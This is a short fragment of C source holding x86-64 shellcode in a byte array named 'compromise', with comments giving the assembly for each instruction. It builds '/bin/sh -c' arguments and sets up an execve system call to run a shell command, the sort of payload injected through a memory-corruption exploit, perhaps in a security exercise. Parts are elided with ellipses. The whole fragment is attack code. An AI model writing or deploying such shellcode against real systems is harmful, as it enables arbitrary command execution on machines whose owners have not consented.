...
char compromise[159] = {
    ...
    0x88, 0x46, 0x07,                              //mov [byte rsi+flagStr-exeStr-2],al      ; move null byte to the end of /bin/sh    
    0x88, 0x46, 0x0B,                              //mov [byte rsi+cmdStr-exeStr-1],al       ; move null byte to the end of -c
    0x88, 0x46, 0x19,                              //mov [byte rsi+arrayAddr-exeStr-1],al    ; move null byte to the end of shell command
    0x48, 0x89, 0x46, 0x32,                            //mov [byte rsi+arrayAddr-exeStr+24],rax  ; move null word to the end of array
    ...
    0x48, 0x89, 0x7E, 0x2A,                            //mov [byte rsi+arrayAddr-exeStr+16],rdi
                            
                            //; execve system call
    0xB0, 0x3B,                                //mov al,0x3B
    0x48, 0x89, 0xF7,                              //mov rdi,rsi
    0x48, 0x8D, 0x76, 0x1A,                            //lea rsi,[byte rsi+arrayAddr-exeStr]
